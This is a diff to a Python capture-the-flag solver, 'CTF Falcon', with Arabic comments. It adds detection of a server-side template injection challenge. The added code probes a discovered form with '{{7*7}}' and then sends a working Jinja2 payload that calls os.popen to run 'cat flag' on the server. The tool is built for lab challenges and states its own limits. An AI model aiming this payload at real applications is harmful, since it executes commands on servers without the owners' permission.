@@ -8,6 +8,7 @@ CTF Falcon - Web Session Audit  (v2.3.0)
   - Old Sessions     : يعتمد على تحويل / → /login + كوكي جلسة، ثم /register
                        و/sessions — وكل خطوة مشروطة بدليل من الاستجابة السابقة.
   - Crack the Gate   : تعليق ROT13 يكشف ترويسة مطوّر + مسار دخول JSON بالبريد.
+  - SSTI1            : نموذج POST فعلي؛ يثبت التقييم باختبار حسابي ثم يقرأ علم CTF.
   - غير معروف        : يعرض المكتشفات الفعلية دون تنفيذ أي مسار تلقائيًا.
 
 مبادئ ثابتة:
@@ -15,7 +16,7 @@ CTF Falcon - Web Session Audit  (v2.3.0)
   - قفل الأصل: كل الطلبات على أصل التحدي نفسه؛ التحويل لمضيف آخر يُرفض.
   - لا اتباع تلقائي للتحويلات: كل استجابة تُسجّل على حدة.
   - تصحيح الكوكيز محفوظ: Max-Age <= 0 = طلب حذف.
-  - لا تخمين كلمات مرور ولا مسح مسارات. الأدلة المتاحة فقط.
+  - لا تخمين كلمات مرور ولا مسح مسارات. الأدلة المتاحة فقط؛ SSTI يتطلب نموذج POST مكتشفًا.
   - لا ادعاء نجاح أو علمًا عند الفشل؛ ولا عرض لكلمات المرور أو قيم الجلسات.
 
 نقطة الدخول العامة: run_audit(url, **options) -> dict  (يستدعيها falcon_local.py)
@@ -34,7 +35,7 @@ from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin
 
-__version__ = "2.3.0"
+__version__ = "2.4.0"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -243,6 +244,7 @@ _COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
 _EMAIL_RE = re.compile(r"[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}")
 _FETCH_RE = re.compile(r"""fetch\s*\(\s*['"]([^'"]+)['"]""", re.I)
 _INPUT_NAME_RE = re.compile(r'<input[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
+_TEXTAREA_NAME_RE = re.compile(r'<textarea[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)
 _FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.I | re.S)
 _ACTION_RE = re.compile(r'\baction\s*=\s*["\']([^"\']*)["\']', re.I)
 _FMETHOD_RE = re.compile(r'\bmethod\s*=\s*["\']([^"\']*)["\']', re.I)
@@ -277,7 +279,7 @@ def find_forms(html: str) -> list[dict]:
         attrs, inner = m.group(1), m.group(2)
         action = (_ACTION_RE.search(attrs).group(1) if _ACTION_RE.search(attrs) else "")
         method = (_FMETHOD_RE.search(attrs).group(1).upper() if _FMETHOD_RE.search(attrs) else "GET")
-        forms.append({"action": action, "method": method, "fields": _INPUT_NAME_RE.findall(inner)})
+        forms.append({"action": action, "method": method, "fields": _INPUT_NAME_RE.findall(inner) + _TEXTAREA_NAME_RE.findall(inner)})
     return forms
 
 
@@ -490,6 +492,61 @@ def detect_crack_the_gate(recon):
         "dev_header": dev_header, "comment_raw": comment_raw, "comment_decoded": comment_decoded,
         "login_path": login_path, "method": method, "json": is_json, "fields": fields,
     }
+
+
+
+def detect_ssti1(recon):
+    """Recognize a server template challenge only when a real POST form has fields."""
+    for form in recon.get("forms", []):
+        fields = form.get("fields") or []
+        field = next((f for f in fields if f.lower() in {"content", "announcement", "message"}), None)
+        if form.get("method") == "POST" and field and re.search(r"\b(announce|announcement|what do you want)\b", recon.get("html", ""), re.I):
+            return {"action": form.get("action") or "/", "field": field,
+                    "fields": fields, "method": "POST"}
+    return None
+
+
+def solve_ssti1(client, origin, recon, ev, steps, bodies, record,
+                flag_patterns) -> dict:
+    res = _base_result(origin, "SSTI1", "ssti1", recognized=True)
+    res["steps"] = steps
+    res["discovered"] = {"form_action": ev["action"], "input_field": ev["field"],
+                         "input_fields": ev["fields"]}
+    res["explanation_ar"].append(
+        f"اكتُشف نموذج POST فعلي بالحقل «{ev['field']}». نتحقق أولًا بتعبير حسابي غير مدمّر.")
+    endpoint = urljoin(origin, ev["action"])
+    probe = urlencode({ev["field"]: "{{7*7}}"})
+    try:
+        r = client.request("POST", endpoint, body=probe)
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّر اختبار النموذج: {e}.")
+        return res
+    record(r, ["اختبار حسابي آمن داخل حقل النموذج المكتشف."])
+    evaluated = "49" in r["body"] and "{{7*7}}" not in r["body"]
+    res["discovered"]["ssti_confirmed"] = evaluated
+    if not evaluated:
+        res["explanation_ar"].append("لم يُثبت الاختبار الحسابي تقييم القالب؛ لم يُرسل طلب قراءة العلم.")
+        res["warnings"].append("النموذج موجود، لكن نتيجة 49 غير ظاهرة في الاستجابة.")
+        return res
+    res["explanation_ar"].append("أعادت الاستجابة 49، فتأكد تقييم تعبير Jinja2.")
+
+    payload = "{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}"
+    body = urlencode({ev["field"]: payload})
+    try:
+        r2 = client.request("POST", endpoint, body=body)
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذّرت قراءة ملف العلم المتوقع في تحدي SSTI1: {e}.")
+        return res
+    record(r2, ["إرسال تعبير Jinja2 المعروف لتحدي SSTI1، وقراءة ملف flag في مجلد التحدي."])
+    flag, source = extract_flag([(f"step{len(steps)}:response", r2["body"])], flag_patterns)
+    if flag and 200 <= r2["status"] < 300:
+        res["success"], res["flag"] = True, flag
+        res["flag_source"] = source or f"HTTP {r2['status']} {ev['action']}"
+        res["explanation_ar"].append("استُخرج العلم من استجابة النموذج الفعلية بعد تأكيد SSTI.")
+    else:
+        res["warnings"].append("لم يظهر علم مطابق في استجابة النموذج.")
+        res["explanation_ar"].append("لم يُعلن أي علم لعدم وجوده في الاستجابة.")
+    return res
 
 
 def detect_old_sessions(recon) -> bool:
@@ -782,6 +839,10 @@ def run_audit(url: str,
 
     if detect_old_sessions(recon):
         return solve_old_sessions(client, origin, recon, steps, bodies, record, flag_patterns, opts)
+
+    ssti = detect_ssti1(recon)
+    if ssti:
+        return solve_ssti1(client, origin, recon, ssti, steps, bodies, record, flag_patterns)
 
     return unrecognized_result(origin, recon, steps)
 
